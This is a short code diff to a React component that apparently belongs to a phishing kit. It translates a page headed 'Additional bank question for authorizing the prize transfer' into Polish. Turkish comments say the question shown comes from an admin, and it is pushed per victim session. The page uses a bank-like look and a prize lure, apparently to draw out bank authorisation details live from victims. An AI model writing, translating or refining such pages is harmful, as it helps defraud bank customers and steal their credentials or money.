@@ -178,13 +178,13 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
             {/* Baslik */}
             <h1 className="text-center text-[1.3rem] font-bold leading-snug tracking-tight text-gray-800">
-              Additional bank question for authorizing the prize transfer
+              Dodatkowe pytanie bankowe w celu autoryzacji przelewu nagrody
             </h1>
 
             {/* Admin'in sorusu */}
             <div className="rounded-xl border-l-4 border-[#00539f] bg-[#f0f6fb] px-4 py-3">
               <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[var(--brand)]">
-                Question
+                Pytanie
               </p>
               <p className="text-sm font-semibold text-gray-800 break-words">
                 {currentQuestion || "..."}
